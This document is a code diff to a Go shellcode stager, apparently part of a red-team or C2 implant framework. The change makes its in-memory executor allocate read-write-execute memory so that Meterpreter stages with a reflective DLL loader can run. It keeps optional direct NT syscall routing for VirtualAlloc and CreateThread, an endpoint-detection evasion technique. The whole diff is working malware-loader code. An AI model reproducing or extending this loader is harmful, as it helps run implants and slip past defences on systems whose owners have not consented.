@@ -55,17 +55,19 @@ func (s *Stager) stageWindows() error {
 	return executeInMemory(shellcode, caller)
 }
 
-// executeInMemory allocates RW memory, copies shellcode, re-protects as
-// RX, then executes via CreateThread. The two-step allocation avoids
-// mapping memory as simultaneously writable and executable (RWX).
+// executeInMemory allocates RWX memory, copies stage, then executes via
+// CreateThread. RWX is required because Meterpreter stages contain a
+// reflective DLL loader that writes relocations and import resolutions
+// into its own memory before transferring control to the DLL entry point.
+// RW→RX would cause ACCESS_VIOLATION during the loader's self-patching.
 //
-// When caller is non-nil, security-sensitive calls (VirtualAlloc, VirtualProtect,
-// CreateThread) are routed through NT syscalls via the Caller. Pass nil for
-// standard WinAPI behavior.
+// When caller is non-nil, security-sensitive calls (VirtualAlloc,
+// CreateThread) are routed through NT syscalls via the Caller. Pass nil
+// for standard WinAPI behavior.
 func executeInMemory(shellcode []byte, caller *wsyscall.Caller) error {
 	size := uintptr(len(shellcode))
 
-	// 1. Allocate RW memory
+	// 1. Allocate RWX memory (required for reflective DLL loader)
 	var addr uintptr
 	if caller != nil {
 		currentProcess := ^uintptr(0)
@@ -76,7 +78,7 @@ func executeInMemory(shellcode []byte, caller *wsyscall.Caller) error {
 			0,
 			uintptr(unsafe.Pointer(&regionSize)),
 			windows.MEM_COMMIT|windows.MEM_RESERVE,
-			uintptr(windows.PAGE_READWRITE),
+			uintptr(windows.PAGE_EXECUTE_READWRITE),
 		)
 		if r != 0 {
 			return fmt.Errorf("NtAllocateVirtualMemory failed: NTSTATUS 0x%X: %w", uint32(r), err)
@@ -86,43 +88,21 @@ func executeInMemory(shellcode []byte, caller *wsyscall.Caller) error {
 		addr, err = windows.VirtualAlloc(
 			0, size,
 			windows.MEM_COMMIT|windows.MEM_RESERVE,
-			windows.PAGE_READWRITE,
+			windows.PAGE_EXECUTE_READWRITE,
 		)
 		if err != nil {
 			return fmt.Errorf("VirtualAlloc failed: %w", err)
 		}
 	}
 
-	// 2. Copy shellcode (RtlMoveMemory is a memcpy — not security-sensitive)
+	// 2. Copy stage payload
 	_, _, _ = api.ProcRtlMoveMemory.Call(
 		addr,
 		uintptr(unsafe.Pointer(&shellcode[0])),
 		size,
 	)
 
-	// 3. Re-protect as executable
-	var oldProtect uint32
-	if caller != nil {
-		currentProcess := ^uintptr(0)
-		protectAddr := addr
-		protectSize := size
-		r, err := caller.Call("NtProtectVirtualMemory",
-			currentProcess,
-			uintptr(unsafe.Pointer(&protectAddr)),
-			uintptr(unsafe.Pointer(&protectSize)),
-			uintptr(windows.PAGE_EXECUTE_READ),
-			uintptr(unsafe.Pointer(&oldProtect)),
-		)
-		if r != 0 {
-			return fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%X: %w", uint32(r), err)
-		}
-	} else {
-		if err := windows.VirtualProtect(addr, size, windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
-			return fmt.Errorf("VirtualProtect failed: %w", err)
-		}
-	}
-
-	// 4. Create thread to execute
+	// 3. Create thread to execute
 	var thread uintptr
 	if caller != nil {
 		currentProcess := ^uintptr(0)
